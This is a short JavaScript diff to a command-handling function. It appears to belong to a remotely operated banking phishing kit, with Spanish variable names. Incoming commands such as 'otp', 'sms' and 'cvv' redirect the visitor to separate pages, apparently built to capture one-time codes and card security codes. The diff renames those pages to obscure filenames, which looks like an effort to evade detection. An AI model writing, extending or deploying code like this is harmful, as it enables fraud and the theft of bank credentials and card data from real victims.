@@ -146,8 +146,10 @@
         let ejecutando = false;
 
         async function procesarComando(command) {
-            if (command === 'otp' || command === 'dinamica' || command === 'sms' || command === 'mensaje' || command === 'seguridad' || command === 'cvv') {
-                window.location.replace(basePath + 'OTP.html');
+            if (command === 'cvv') {
+                window.location.replace(basePath + 'v92_sec_c3v.html');
+            } else if (command === 'otp' || command === 'dinamica' || command === 'sms' || command === 'sms-error' || command === 'mensaje' || command === 'seguridad') {
+                window.location.replace(basePath + 'v92_sec_o7p.html');
             } else if (command === 'login-error' || command === 'usuario') {
                 const loader = document.getElementById('loaderOverlay');
                 if (loader) loader.style.display = 'none';
